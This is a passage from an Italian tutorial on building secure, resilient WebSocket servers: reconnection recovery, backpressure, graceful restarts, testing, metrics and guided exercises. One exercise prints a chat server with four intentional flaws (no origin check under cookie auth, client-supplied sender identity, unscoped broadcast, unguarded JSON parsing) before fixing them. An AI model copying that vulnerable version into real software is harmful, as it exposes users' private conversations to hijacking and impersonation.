```
LA FINESTRA CIECA: fra la caduta della connessione e la
riconnessione passano secondi, e ciò che il server ha trasmesso in
quel lasso di tempo è sparito. Il client non sa nemmeno di averlo
perso — ha ripreso a ricevere, e sembra tutto a posto.

  15:04:02 la connessione cade · 15:04:03 arriva un messaggio nel
  canale → PERSO · 15:04:07 il client si riconnette · 15:04:08
  arriva il successivo, e viene ricevuto

➜ IL CLIENT VEDE UNA CONVERSAZIONE CON UN BUCO, e nessun errore.
```

```typescript
// La soluzione: ogni messaggio ha un numero di sequenza per canale,
// e alla riconnessione il client dice da dove ripartire.
export async function iscriviConRecupero(
  ws: Connessione,
  canale: string,
  ultimoVisto: number | null,
): Promise<void> {
  iscrivi(ws, canale)

  if (ultimoVisto === null) {
    // Prima iscrizione: gli ultimi N, non tutta la storia
    const recenti = await storico.ultimi(canale, 50)
    return ws.send(JSON.stringify({ tipo: 'storico', messaggi: recenti }))
  }

  // ⚠ IL RECUPERO VA LIMITATO: un client fermo da tre giorni
  //   chiederebbe decine di migliaia di messaggi in un colpo solo.
  //   Oltre la soglia si dice "troppo indietro" e si riparte pulito.
  const persi = await storico.dopo(canale, ultimoVisto, 500)
  if (persi.length >= 500) {
    return ws.send(JSON.stringify({ tipo: 'storico_troncato', ricaricaTutto: true }))
  }
  ws.send(JSON.stringify({ tipo: 'recupero', messaggi: persi }))
}
```

```javascript
// Il client: backoff con jitter (tutorial_22 §B5), e la memoria di
// dove era arrivato.
class ConnessioneResiliente {
  tentativo = 0
  ultimoVisto = null

  constructor(url) {
    this.url = url
    this.connetti()
  }

  connetti() {
    this.ws = new WebSocket(this.url)

    this.ws.onopen = () => {
      this.tentativo = 0
      // All'apertura si dice da dove ripartire: è il §B8 lato client
      this.ws.send(JSON.stringify({ tipo: 'iscriviti', dopo: this.ultimoVisto }))
    }

    this.ws.onmessage = (evento) => {
      const messaggio = JSON.parse(evento.data)
      if (messaggio.seq) this.ultimoVisto = messaggio.seq
      this.onMessaggio?.(messaggio)
    }

    this.ws.onclose = (evento) => {
      // Alcuni close code NON vanno ritentati: un token scaduto va
      // rinnovato prima, e su una policy violata riprovare è inutile
      if (evento.code === 4001) return this.onRinnovoRichiesto?.()
      if (evento.code === 1008) return this.onNonAutorizzato?.()

      const attesa = Math.random() * Math.min(30_000, 500 * 2 ** this.tentativo++)
      setTimeout(() => this.connetti(), attesa)
    }
  }
}
```

⚠ Il jitter non è un dettaglio: senza, tutti i client di un server appena caduto si riconnettono nello stesso millisecondo sul server che resta, e lo fanno cadere a sua volta. È la retry storm del tutorial 22, con l'aggravante che qui la ripartenza è simultanea per costruzione.

---

## B9. Backpressure e chiusura ordinata

```
LA BACKPRESSURE: il server produce più in fretta di quanto il client
consuma, i dati si accumulano nel buffer del socket, e quel buffer
sta nella memoria del server.

  un client su rete lenta, 200 messaggi al secondo di dashboard →
  `bufferedAmount` sale a 40 MB → con cento client così sono quattro
  gigabyte → il processo muore, e i log dicono solo "out of memory"

⚠ È IL PROBLEMA CHE SI SCOPRE IN PRODUZIONE E MAI IN SVILUPPO: in
  locale la rete non è mai lenta.
```

```typescript
const SOGLIA_BUFFER = 1024 * 1024 // 1 MB

// `bufferedAmount` è quanto è accodato ma non ancora scritto sulla
// rete: la misura diretta di quanto il client è indietro
export function inviaConControllo(
  ws: Connessione,
  messaggio: { priorita?: 'alta' | 'normale' } & object,
): boolean {
  if (ws.bufferedAmount > SOGLIA_BUFFER) {
    if (messaggio.priorita !== 'alta') {
      ws.scartati = (ws.scartati ?? 0) + 1
      return false // per una dashboard, saltare un aggiornamento va bene
    }
    // Se non passano nemmeno i messaggi importanti, quel client non
    // sta consumando: tenerlo aperto costa memoria e basta
    if (ws.bufferedAmount > SOGLIA_BUFFER * 5) {
      ws.close(1013, 'consumatore troppo lento')
      return false
    }
  }

  ws.send(JSON.stringify(messaggio))
  return true
}
```

```
⚠ SCARTARE È UNA DECISIONE DI PRODOTTO, non tecnica, e va presa
  esplicitamente: una dashboard che mostra l'ultimo valore si può
  scartare e nessuno se ne accorge · una chat NO, si accoda nello
  storico e il client la recupera come dopo una disconnessione
  (§B8) · un ordine non passa proprio da un WebSocket, perché ciò
  che non può perdersi va su HTTP, dove c'è una risposta.
```

```typescript
// La chiusura ordinata al riavvio: i client vanno avvisati, non
// tagliati fuori — è il §D4 dal lato del codice.
export function avviaSvuotamento(wss: WebSocketServer, attesaMs = 30_000): void {
  inSvuotamento = true // l'handshake ora rifiuta con 503
  for (const ws of wss.clients) {
    ws.send(JSON.stringify({ tipo: 'server_in_riavvio', riconnettiTraMs: 5_000 }))
  }

  setTimeout(() => {
    // 1012 = service restart: il client sa che deve riconnettersi, e
    // i suoi tentativi si spalmano grazie al jitter (§B8)
    for (const ws of wss.clients) ws.close(1012, 'riavvio')
    setTimeout(() => {
      for (const ws of wss.clients) ws.terminate() // chi non ha chiuso
      wss.close()
    }, 5_000)
  }, attesaMs).unref()
}

process.on('SIGTERM', () => avviaSvuotamento(wss))
```

---

# Parte C — Esercizi Pratici Guidati

---

## C1. Esercizi progressivi con soluzione

### Esercizio 1 — La chat che chiunque può dirottare

**Obiettivo:** trovare le quattro vulnerabilità in un server di chat funzionante, e chiuderle.

```typescript
// In produzione da sei mesi, e funziona benissimo
import { WebSocketServer } from 'ws'
import { parse } from 'cookie'

const wss = new WebSocketServer({ port: 8080 })

wss.on('connection', (ws, richiesta) => {
  const cookie = parse(richiesta.headers.cookie ?? '')
  const sessione = sessioni.get(cookie['sid'])
  if (!sessione) return ws.close()

  ws.on('message', (dati) => {
    const messaggio = JSON.parse(dati.toString())
    for (const client of wss.clients) {
      client.send(JSON.stringify({
        canale: messaggio.canale,
        da: messaggio.da,
        testo: messaggio.testo,
      }))
    }
  })
})
```

```
LA DIAGNOSI — quattro vulnerabilità
 1. CSWSH: nessun origin check, e l'autenticazione è via cookie —
    qualunque sito apre questa connessione col cookie della vittima
    e legge tutta la sua chat (§B1)
 2. `messaggio.da` VIENE DAL CLIENT: si parla come chiunque (§B4)
 3. NESSUNA AUTORIZZAZIONE SUL CANALE: il broadcast va a TUTTI i
    client connessi, il campo `canale` è decorativo, e ogni utente
    riceve i messaggi di ogni canale privato
 4. `JSON.parse` NUDO: un messaggio non-JSON solleva un'eccezione
    dentro un gestore di evento e porta giù il processo (§A4)
```

```typescript
// LA SOLUZIONE — handshake controllato, identità dalla connessione,
// consegna solo agli iscritti autorizzati
import { WebSocketServer, type WebSocket } from 'ws'
import { z } from 'zod'

// 2. e 4. Lo schema NON contiene `da`: il campo non è validato, è
//    proprio assente. Con `.strict()` un messaggio che lo porta
//    viene rifiutato invece che ripulito.
const SchemaMessaggio = z
  .object({
    tipo: z.literal('messaggio'),
    canale: z.string().regex(/^[a-z]+:[a-z0-9-]{1,64}$/),
    testo: z.string().trim().min(1).max(2000),
  })
  .strict()

const wss = new WebSocketServer({ noServer: true, maxPayload: 8 * 1024 })

server.on('upgrade', async (richiesta, socket, testa) => {
  const rifiuta = (s: string) => { socket.write(`HTTP/1.1 ${s}\r\n\r\n`); socket.destroy() }

  // 1. L'origin con confronto esatto, e il ticket monouso al posto
  //    del cookie: il CSWSH non è più possibile (§B2)
  if (!ORIGINI_AMMESSE.has(richiesta.headers.origin ?? '')) return rifiuta('403 Forbidden')

  const utente = await autenticaHandshake(richiesta)
  if (!utente) return rifiuta('401 Unauthorized')

  wss.handleUpgrade(richiesta, socket, testa, (ws) => {
    Object.assign(ws, { utenteId: utente.id, ruolo: utente.ruolo })
    wss.emit('connection', ws)
  })
})

wss.on('connection', (ws: WebSocket & { utenteId: string }) => {
  ws.on('message', async (dati) => {
    let grezzo: unknown
    try {
      grezzo = JSON.parse(dati.toString())
    } catch {
      return ws.close(1007, 'JSON non valido')
    }

    const analizzato = SchemaMessaggio.safeParse(grezzo)
    if (!analizzato.success) return ws.close(1007, 'messaggio non conforme')

    const { canale, testo } = analizzato.data

    // 3. Si consegna SOLO agli iscritti a quel canale, e solo se
    //    chi scrive ha il permesso di scriverci
    if (!await autorizza(ws, 'canale:*:scrivi', canale)) {
      return ws.send(JSON.stringify({ tipo: 'errore', codice: 'canale_non_disponibile' }))
    }

    const uscente = JSON.stringify({
      canale,
      testo,
      da: ws.utenteId,      // dalla CONNESSIONE
      quando: Date.now(),   // dal SERVER
    })
    for (const iscritto of iscrizioni.get(canale) ?? []) iscritto.send(uscente)
  })
})
```

```
# VERIFICA — le quattro prove, una per difetto
# 1. una pagina su un'altra origine apre la connessione → 403
# 2. un messaggio con `da: "admin"` → rifiutato dallo schema strict
# 3. un utente non iscritto a `progetto:42` non riceve nulla
# 4. con `wscat` si manda `non-json` → chiude con 1007, e il
#    processo resta in piedi
```

---

### Esercizio 2 — Le connessioni che non muoiono mai

**Obiettivo:** un server perde 200 MB al giorno e dopo cinque giorni viene riavviato dal supervisore. Trovare le tre perdite.

```typescript
// Il server, semplificato
const sessioniAttive = new Map<string, WebSocket>()
const timerPerUtente = new Map<string, NodeJS.Timeout>()

wss.on('connection', (ws: Connessione) => {
  sessioniAttive.set(ws.utenteId, ws)

  const timer = setInterval(async () => {
    ws.send(JSON.stringify(await leggiStato(ws.utenteId))) // ogni secondo
  }, 1_000)
  timerPerUtente.set(ws.utenteId, timer)

  ws.on('message', (dati) => gestisci(ws, dati))
})
```

```
LA DIAGNOSI — tre perdite che si sommano
 1. NESSUN GESTORE `close`: né `sessioniAttive` né `timerPerUtente`
    vengono mai ripuliti, e il timer continua a interrogare il
    database per un utente che non c'è più
 2. NESSUN HEARTBEAT: le half-open non emettono `close`, quindi il
    punto 1 da solo non basterebbe — l'evento non arriverebbe (§A5)
 3. `ws.send` SU UNA CONNESSIONE CHIUSA solleva un'eccezione dentro
    il callback di `setInterval`, dove non c'è nessun `try`
```

```typescript
// LA SOLUZIONE — ogni risorsa acquisita ha un rilascio sullo stesso
// oggetto, e l'heartbeat garantisce che `close` arrivi davvero
wss.on('connection', (ws: Connessione) => {
  // 2. La connessione parte viva e risponde ai ping (§A5)
  ws.viva = true
  ws.on('pong', () => { ws.viva = true })

  // Più schede dello stesso utente sono normali: la mappa tiene un
  // insieme, non una connessione sola
  let insieme = sessioniAttive.get(ws.utenteId)
  if (!insieme) sessioniAttive.set(ws.utenteId, (insieme = new Set()))
  insieme.add(ws)

  const timer = setInterval(async () => {
    // 3. Stato controllato PRIMA di inviare, e invio racchiuso: la
    //    connessione può chiudersi fra il controllo e l'invio
    if (ws.readyState !== ws.OPEN) return
    try {
      ws.send(JSON.stringify(await leggiStato(ws.utenteId)))
    } catch (errore) {
      registro.warn('invio fallito', { utenteId: ws.utenteId, errore })
    }
  }, 1_000)

  // 1. UN SOLO PUNTO DI PULIZIA, e sta su `close`: qualunque sia il
  //    motivo della chiusura — remota, locale, `terminate` — passa
  //    di qui.
  ws.once('close', () => {
    clearInterval(timer)
    const attive = sessioniAttive.get(ws.utenteId)
    attive?.delete(ws)
    if (attive?.size === 0) sessioniAttive.delete(ws.utenteId)
  })
})
```

```
# VERIFICA — la prova che conta è quella brutale
# 1. 500 connessioni aperte e CHIUSE in modo pulito:
#    `wss.clients.size` torna a 0, e `sessioniAttive.size` pure
# 2. 500 connessioni e il client UCCISO senza chiudere (kill -9):
#    dopo 60 secondi l'heartbeat le ha rimosse tutte
# 3. `process.memoryUsage().heapUsed` torna al valore di partenza
#    dopo un ciclo di gc — che il punto 1 da solo non garantisce
```

---

### Esercizio 3 — Il broadcast che arriva a metà utenti

**Obiettivo:** dopo essere passati da uno a tre server, gli utenti si lamentano che i messaggi arrivano "a volte". Trovare le tre cause.

```typescript
// Il codice non è cambiato: prima funzionava
export function trasmetti(canale: string, messaggio: unknown): void {
  for (const ws of iscrizioni.get(canale) ?? []) {
    ws.send(JSON.stringify(messaggio))
  }
}
```

```
LA DIAGNOSI — tre cause distinte, e la terza è la peggiore
 1. NESSUN PUB/SUB: `iscrizioni` è la mappa in memoria di QUESTO
    processo, quindi un messaggio raggiunge un terzo degli utenti —
    che è esattamente ciò che significa "a volte" (§B7)
 2. NESSUNA STICKY SESSION: col fallback in long-polling
    l'handshake si spezza su più richieste HTTP che finiscono su
    processi diversi, e fallisce in modo intermittente
 3. NESSUN RECUPERO ALLA RICONNESSIONE: i tre server si riavviano a
    rotazione a ogni rilascio, e ogni riavvio apre una finestra
    cieca (§B8)
```

```typescript
// LA SOLUZIONE — pub/sub per la consegna, sequenza per il recupero
const ID_ISTANZA = randomUUID()

const pubblicatore = new Redis(process.env['REDIS_URL']!)
const sottoscrittore = pubblicatore.duplicate()
await sottoscrittore.psubscribe('canale:*')

sottoscrittore.on('pmessage', (_schema, canale, grezzo) => {
  const busta = JSON.parse(grezzo)
  if (busta.origine === ID_ISTANZA) return // già consegnato in locale
  consegnaLocale(canale, busta.messaggio)
})

// 1. e 3. La sequenza è assegnata atomicamente da Redis ed è unica
//    per canale su TUTTE le istanze: è ciò che permette al client
//    di dire "riparto da 4712"
export async function trasmettiOvunque(canale: string, corpo: object): Promise<void> {
  const seq = await pubblicatore.incr(`seq:${canale}`)
  const messaggio = { ...corpo, seq, quando: Date.now() }

  await storico.aggiungi(canale, messaggio) // per il recupero (§B8)
  consegnaLocale(canale, messaggio)
  await pubblicatore.publish(canale, JSON.stringify({ origine: ID_ISTANZA, messaggio }))
}

function consegnaLocale(canale: string, messaggio: unknown): void {
  const codificato = JSON.stringify(messaggio)
  for (const ws of iscrizioni.get(canale) ?? []) {
    if (ws.readyState === ws.OPEN) ws.send(codificato)
  }
}
```

```
# VERIFICA — con tre istanze avviate e Redis in mezzo
# 1. un client per istanza, uno manda: tutti e tre ricevono UNA
#    volta sola ciascuno (è il controllo su `origine`)
# 2. si spegne l'istanza 2: i suoi client si riconnettono altrove,
#    chiedono `dopo: <ultimo seq>` e ricevono il buco
# 3. la sequenza è monotòna per canale: nessun salto, nessun doppio
```

---

## C2. Mini-progetto: la chat del portale

**Obiettivo:** la chat interna del portale aziendale del corso, con ciò che serve perché regga tre istanze e un anno di esercizio.

```
IL PROGETTO — cosa deve avere, e in che ordine costruirlo

  1. HANDSHAKE ► origin con lista chiusa, ticket monouso da 30 s
     (§B2), e i limiti del §B6: 64 kB per frame, 10 connessioni per
     IP, 10.000 totali, 5 s per autenticarsi
  2. IDENTITÀ ► sulla connessione, mai nel messaggio. Scadenza
     controllata a ogni messaggio, rinnovo sul canale, revoca
     immediata via pub/sub (§B3)
  3. CANALI ► `stanza:<id>` con autorizzazione all'iscrizione (§B4),
     sequenza per canale e storico con recupero (§B8)
  4. LIMITI PER MESSAGGIO ► 10 messaggi e 30 typing ogni 10 s, con
     risposta graduata invece della chiusura immediata (§B5)
  5. ESERCIZIO ► heartbeat a 30 s, backpressure a 1 MB, svuotamento
     su SIGTERM con 1012 (§B9, §D4)
```

```typescript
// server/chat.ts — l'ossatura, con i pezzi al loro posto
const stanza = z.string().uuid()

const SchemaEntrante = z.discriminatedUnion('tipo', [
  z.object({ tipo: z.literal('iscriviti'), stanza, dopo: z.number().int().nullable() }).strict(),
  z.object({ tipo: z.literal('messaggio'), stanza, testo: z.string().trim().min(1).max(2000) }).strict(),
  z.object({ tipo: z.literal('typing'), stanza }).strict(),
  z.object({ tipo: z.literal('rinnova_token'), token: z.string().max(4096) }).strict(),
])

wss.on('connection', (ws: Connessione) => {
  ws.viva = true
  ws.on('pong', () => { ws.viva = true })

  ws.on('message', async (dati) => {
    if (!tokenValido(ws)) return ws.close(CHIUSURA.TOKEN_SCADUTO, 'token scaduto')

    let grezzo: unknown
    try { grezzo = JSON.parse(dati.toString()) } catch { return ws.close(1007, 'JSON') }

    const analizzato = SchemaEntrante.safeParse(grezzo)
    if (!analizzato.success) return ws.close(1007, 'messaggio non conforme')

    const messaggio = analizzato.data
    if (!entroIlLimite(ws, messaggio.tipo)) return avvisaLimite(ws, messaggio.tipo)

    switch (messaggio.tipo) {
      case 'iscriviti':
        return iscriviConRecupero(ws, `stanza:${messaggio.stanza}`, messaggio.dopo)
      case 'messaggio':
        if (!await autorizza(ws, 'stanza:*:scrivi', messaggio.stanza)) return nega(ws)
        return void trasmettiOvunque(`stanza:${messaggio.stanza}`, {
          tipo: 'messaggio',
          testo: messaggio.testo,
          da: ws.utenteId,
        })
      case 'typing':
        // Il typing è effimero: non entra nello storico e non
        // consuma sequenza
        return trasmettiEffimero(`stanza:${messaggio.stanza}`, { tipo: 'typing', da: ws.utenteId })
      case 'rinnova_token':
        return gestisciRinnovo(ws, messaggio)
    }
  })

  ws.once('close', () => rilasciaTutto(ws))
})
```

```
# ESTENSIONI, in ordine di utilità
# 1. La presenza: chi è online in una stanza. Va in Redis con un
#    TTL rinnovato dall'heartbeat, non in memoria — con tre istanze
#    nessuna conosce l'elenco completo.
# 2. La conferma di lettura, dove la sequenza del §B8 passa da
#    utile a indispensabile.
# 3. Le metriche del §D3 e un test di carico con k6 su duemila
#    connessioni, per misurare la memoria per connessione.
```

---

# Parte D — Approfondimento per Esperti

---

## D1. Testare il real-time

```
IL PROBLEMA: un test WebSocket è ASINCRONO E SENZA RICHIESTA. Non
c'è una risposta da attendere: c'è un messaggio che arriva, forse,
fra poco. I test scritti male aspettano con un `setTimeout`, e sono
instabili per costruzione.

➜ SI ASPETTA UN EVENTO, MAI UN TEMPO — con un timeout esplicito,
  così un test che fallisce lo dice invece di appendersi.
```

```typescript
import { describe, it, expect } from 'vitest'
import WebSocket from 'ws'

/** Aspetta il primo messaggio che soddisfa il predicato, o fallisce. */
function attendi(ws: WebSocket, corrisponde: (m: never) => boolean, entroMs = 2_000): Promise<never> {
  return new Promise((risolvi, rifiuta) => {
    const scadenza = setTimeout(() => rifiuta(new Error('nessun messaggio in tempo')), entroMs)
    ws.on('message', (dati) => {
      const messaggio = JSON.parse(dati.toString())
      if (!corrisponde(messaggio)) return
      clearTimeout(scadenza)
      risolvi(messaggio)
    })
  })
}

describe('chat', () => {
  it('rifiuta un handshake da un origin non ammesso', async () => {
    const ws = new WebSocket(`ws://localhost:${porta}/ws?ticket=${await ticket()}`, {
      headers: { origin: 'https://sito-ostile.it' },
    })
    const errore = await new Promise<Error>((r) => ws.once('error', r))
    expect(errore.message).toContain('403')
  })
})
```

```
COSA VA TESTATO, in ordine di quanto costa non averlo testato

  · l'handshake rifiutato: origin sbagliato, ticket assente, già
    speso, scaduto
  · l'identità: un messaggio con `da` forgiato non deve passare
  · l'autorizzazione: un non-membro non riceve i messaggi del
    canale — si verifica con DUE connessioni
  · il limite: N+1 messaggi in una finestra danno la risposta
    graduata attesa
  · la pulizia: dopo `close` la mappa delle sessioni è vuota
  · il recupero: si chiude, si trasmette, si riapre con `dopo`, e
    il buco dev'essere colmato

⚠ IL TEST DI CARICO NON È FACOLTATIVO qui: è l'unico che rivela la
  memoria per connessione. Duemila connessioni con k6 o Artillery
  dicono se il processo regge il numero previsto, e quel costo
  moltiplicato per le connessioni attese è la memoria da chiedere
  al container.
```

---

## D2. WebSocket, SSE o polling

```
LA DOMANDA GIUSTA È: IN QUANTE DIREZIONI DEVE ANDARE IL FLUSSO?

  SERVER → CLIENT SOLTANTO ────────────► SERVER-SENT EVENTS
    notifiche, prezzi, avanzamento di un job, log in diretta
    ✅ è HTTP: passa dai proxy, usa CORS, l'autenticazione è quella
       di sempre — niente CSWSH, niente ticket, niente handshake
    ✅ la riconnessione è nel protocollo: `Last-Event-ID` fa il
       recupero del §B8 senza scrivere una riga
    ❌ solo testo, e su HTTP/1.1 conta contro il limite di sei
       connessioni per dominio (su HTTP/2 non è un problema)

  ENTRAMBE LE DIREZIONI, MOLTI MESSAGGI ► WEBSOCKET
    chat, editing collaborativo, giochi, presenza

  AGGIORNAMENTO OGNI 30 SECONDI O PIÙ ─► POLLING, senza vergogna:
    è cacheabile, non tiene stato, e non ha nessuno dei problemi
    di questo tutorial

⚠ IL 70% DEI WEBSOCKET IN PRODUZIONE MANDA DATI IN UNA DIREZIONE
  SOLA — e con SSE avrebbe metà del codice e nessuna delle superfici
  di attacco del §B1 e §B2. Prima di aprire un WebSocket, la domanda
  è se il client ha davvero qualcosa da dire in tempo reale, o se
  gli basta una POST normale quando succede qualcosa.
```

---

## D3. Osservare una connessione persistente

```
LE METRICHE HTTP NON SERVONO: non ci sono richieste al secondo né
un tempo di risposta. Quelle che contano sono altre.

  connessioni attive ► dice se il processo regge, e va confrontato
      col limite del §B6, non col carico di ieri
  connessioni per istanza ► se sono sbilanciate, le sticky session
      stanno mandando tutti sullo stesso processo
  durata delle connessioni ► una mediana di pochi minuti significa
      che qualcosa le sta chiudendo: un proxy con timeout basso, o
      l'heartbeat troppo lento
  close code, per codice ► il 1006 è quello da guardare: se cresce,
      qualcosa fra client e server sta tagliando la connessione
  bufferedAmount al p99 ► è la backpressure (§B9), e sale prima che
      la memoria dia problemi
  messaggi scartati per limite ► uno solo che sale è un client
      rotto, molti insieme sono un attacco
  memoria per connessione ► si misura dopo un'ora di esercizio,
      non all'avvio
```

⚠ Il conteggio va fatto sull'oggetto vivo, non su un contatore tenuto a mano: un contatore si disallinea al primo percorso di uscita dimenticato, e nessuno se ne accorge.

```typescript
export function raccogliMetriche(wss: WebSocketServer): void {
  metriche.imposta('ws.connessioni_attive', wss.clients.size)

  let bufferTotale = 0
  for (const ws of wss.clients) bufferTotale += ws.bufferedAmount
  metriche.imposta('ws.buffer_totale_byte', bufferTotale)
}

// I close code si contano dove si chiudono, col codice come
// etichetta: è l'unica metrica che dice PERCHÉ finiscono
ws.once('close', (codice) => {
  metriche.incrementa('ws.chiusure', { codice: String(codice) })
  metriche.osserva('ws.durata_s', (Date.now() - ws.apertaIl) / 1000)
})
```

---

## D4. Il deploy che non butta giù tutti

```
IL PROBLEMA CHE NON ESISTE IN HTTP: un rilascio con connessioni
persistenti non è un cambio di processo indolore. Diecimila client
perdono la connessione insieme, e si riconnettono insieme.

  · senza jitter (§B8) il picco è diecimila handshake nello stesso
    secondo, ognuno con una verifica del ticket
  · se l'istanza nuova non è pronta, si riconnettono su quelle
    vecchie e le fanno cadere a catena
  · se lo stato viveva in memoria, è perso

LA SEQUENZA CHE FUNZIONA
  1. l'istanza smette di accettare NUOVE connessioni (503) e si
     toglie dal load balancer
  2. si avvisano i client con un messaggio applicativo, dando un
     tempo di riconnessione suggerito
  3. si aspetta che chiudano da soli: trenta secondi bastano per la
     maggior parte
  4. si chiude il resto con 1012, che dice "riconnettiti", e
     `terminate` per chi non ha risposto

⚠ IL PUNTO 3 È QUELLO CHE DISTRIBUISCE IL PICCO. Un client che sa in
  anticipo di dover riconnettersi può farlo con calma, e il
  suggerimento `riconnettiTraMs` gli dà una base su cui applicare
  il proprio jitter.
```

⚠ Un rilascio blue-green con connessioni persistenti richiede che le due versioni convivano: i client sulla vecchia restano lì finché non si riconnettono. Il protocollo deve quindi tollerare una versione di scarto in entrambe le direzioni — un campo nuovo che la vecchia ignora, e nessun campo rimosso finché tutti non sono passati.

---

## D5. Quando NON servono i WebSocket

```
UN WEBSOCKET AGGIUNGE: un protocollo in più, una superficie di
attacco che HTTP non ha, uno stato che complica lo scaling, e una
classe di guasti — half-open, backpressure, riconnessione — che
nessuno testa finché non capitano. Il costo è reale.

NON SERVONO QUANDO
  ❌ il flusso è in una sola direzione: SSE fa la stessa cosa
     restando HTTP, e la riconnessione è nel protocollo (§D2)
  ❌ l'aggiornamento può aspettare mezzo minuto: il polling è
     cacheabile e non tiene stato
  ❌ l'evento è raro: una notifica al giorno non giustifica una
     connessione aperta ventiquattro ore
  ❌ il dato non può perdersi: un WebSocket non ha conferme di
     consegna, e ordini e pagamenti vanno su HTTP

SERVONO DAVVERO QUANDO
  ✅ entrambi i lati parlano, e spesso
  ✅ la latenza sotto il secondo è un requisito, non un desiderio
  ✅ c'è presenza da mantenere — chi è online, chi sta scrivendo
  ✅ il volume di messaggi rende il costo degli header HTTP
     dominante rispetto al contenuto
```

---

# Parte E — Riepilogo, Checklist e Prossimi Passi

---

## Riepilogo concettuale

```
WEBSOCKET E SICUREZZA DEL REAL-TIME — Mappa dei concetti

IL PROTOCOLLO
├── handshake HTTP Upgrade → 101: è QUI che si decide chi entra
├── Sec-WebSocket-Accept non è sicurezza ma conformità: la
│     trasformazione è pubblica
├── frame FIN · opcode · MASK — il masking difende dai proxy, non
│     dagli intercettatori
├── close code: 1006 è quello che si vede quando qualcosa si rompe,
│     e 4000-4999 sono i tuoi
└── il browser non manda header custom: da lì nasce tutto il §B2

LE SUPERFICI CHE HTTP NON HA
├── CSWSH: nessuna same-origin policy sull'handshake, e i cookie
│     partono da soli → origin con lista chiusa + SameSite, o
│     meglio nessun cookie
├── la connessione dura ore: il token scade dentro, e la revoca va
│     propagata attivamente
└── il canale è aperto in entrata: limite per messaggio E per byte,
      e i limiti di numero e dimensione PRIMA dell'apertura

L'IDENTITÀ
├── ticket monouso: non è allegato automaticamente da nessuno, e
│     scade prima di poter essere letto in un log
└── sta sulla CONNESSIONE, mai nel messaggio — lo schema
      `.strict()` senza i campi d'identità lo rende strutturale, e
      ogni azione va autorizzata, non solo l'ingresso

L'ESERCIZIO
├── heartbeat: senza, le half-open si accumulano fino ai file
│     descriptor — TCP da solo ci mette due ore
├── un solo punto di pulizia, su `close`
├── backpressure: `bufferedAmount` è la misura, e scartare è una
│     decisione di prodotto
└── svuotamento su SIGTERM con 1012, per non riconnettere tutti
      nello stesso millisecondo

LO SCALING E LA SCELTA
├── sticky session per l'HANDSHAKE, pub/sub per i MESSAGGI: due
│     problemi distinti
├── il pub/sub di Redis non garantisce la consegna: per la chat va
│     bene, per un ordine no
├── la sequenza per canale colma la finestra cieca fra caduta e
│     riconnessione, che altrimenti il client non vede nemmeno
└── SSE se il flusso è in una direzione · polling se mezzo minuto
      basta · WebSocket quando entrambi i lati parlano spesso
```

---

## Checklist di competenze

**Parte A — Basi**

- [ ] Sai cosa succede nell'handshake, perché
      `Sec-WebSocket-Accept` non è sicurezza, e perché il browser
      non ti lascia mandare header custom
- [ ] Leggi la struttura di un frame e sai a cosa serve il masking
- [ ] Conosci i close code che contano, e usi il range 4000-4999
- [ ] Sai perché `JSON.parse` nudo in un gestore di evento è
      pericoloso, e gestisci l'upgrade a mano per decidere prima
      di aprire
- [ ] Implementi un heartbeat, e sai perché TCP da solo non basta

**Parte B — Comprensione**

- [ ] Sai cos'è il CSWSH e perché la same-origin policy non lo ferma
- [ ] Controlli l'origin con confronto esatto, e sai perché
      `startsWith` non basta
- [ ] Scegli fra le quattro strategie di autenticazione, e sai
      perché il ticket monouso elimina il problema invece di gestirlo
- [ ] Gestisci scadenza e revoca a connessione aperta, e verifichi
      il proprietario del token al rinnovo
- [ ] Autorizzi ogni azione, non prendi mai l'identità dal
      messaggio, e limiti per tipo E per byte
- [ ] Metti i cinque limiti anti-DoS prima dell'apertura
- [ ] Distingui sticky session e pub/sub, e sai che Redis non
      garantisce la consegna
- [ ] Colmi la finestra cieca con una sequenza per canale
- [ ] Riconosci la backpressure e sai quando scartare

**Parte C — Pratica**

- [ ] Hai chiuso le quattro vulnerabilità di un server di chat
- [ ] Hai eliminato tre perdite di memoria da un server persistente
- [ ] Hai reso corretto un broadcast su tre istanze
- [ ] Hai costruito una chat che regge lo scaling e un anno di esercizio

**Parte D — Esperto**

- [ ] Testi aspettando eventi, mai tempi, e con un timeout esplicito
- [ ] Sai misurare la memoria per connessione, e perché va fatto
- [ ] Scegli fra WebSocket, SSE e polling con una motivazione, e
      conosci le metriche di una connessione persistente
- [ ] Sai fare un rilascio senza riconnettere tutti insieme, e sai
      dire quando un WebSocket non serve

---

## Anti-pattern da evitare

| Anti-pattern | Problema | Soluzione |
|---|---|---|
| Nessun controllo dell'origin | CSWSH: qualunque sito apre la connessione coi cookie della vittima | Lista chiusa, confronto esatto, nell'handshake |
| Autenticare e non riverificare | La connessione dura ore, il token no | Scadenza a ogni messaggio, revoca via pub/sub |
| Leggere `userId` dal messaggio | Chiunque scrive come chiunque | L'identità sta sulla connessione; lo schema `.strict()` senza quei campi |
| `JSON.parse` senza `try` | Un messaggio malformato porta giù il processo | `try`/`catch` e chiusura con 1007 |
| Nessun heartbeat | Le half-open si accumulano fino ai file descriptor | Ping ogni 30 s, `terminate` su chi non risponde |
| Nessun `maxPayload` | Un frame da 100 MB è già in memoria quando lo vedi | Limite sulla libreria, non nel gestore |
| Sticky session credute sufficienti | Non risolvono il broadcast | Pub/sub per i messaggi, sticky per l'handshake |
| Riconnessione senza recupero | Il client vede un buco e non lo sa | Sequenza per canale e `dopo:` all'iscrizione |
| Ignorare `bufferedAmount` | Un client lento consuma la memoria del server | Soglia, scarto dei non critici, chiusura del lento |

---

## Troubleshooting rapido

**L'handshake fallisce con 400 dietro Nginx**
- Causa: mancano `proxy_set_header Upgrade`/`Connection` e `proxy_http_version 1.1`
- Fix: aggiungerli nel `location` del WebSocket

**La connessione si chiude con 1006 ogni 60 secondi esatti**
- Causa: un proxy o un load balancer chiude le inattive
- Fix: heartbeat sotto la soglia, e alzare `proxy_read_timeout`

**Il broadcast raggiunge solo una parte degli utenti**
- Causa: più istanze senza pub/sub
- Fix: Redis pub/sub, saltando l'istanza che ha pubblicato

**Dopo un rilascio l'API cade per qualche minuto**
- Causa: tutti i client si riconnettono insieme
- Fix: svuotamento con preavviso e 1012, e jitter lato client

**Il token scade e la connessione continua a funzionare**
- Causa: verifica solo all'handshake
- Fix: scadenza controllata a ogni messaggio, e canale di rinnovo

---

## Prossimi passi

| Modulo | Collegamento con questo tutorial |
|---|---|
| `tutorial_24_graphql.md` | Le subscription: gli stessi problemi, dentro un protocollo che li nasconde |
| `tutorial_25_nextjs.md` | Dove mettere un server WebSocket in un'applicazione App Router |
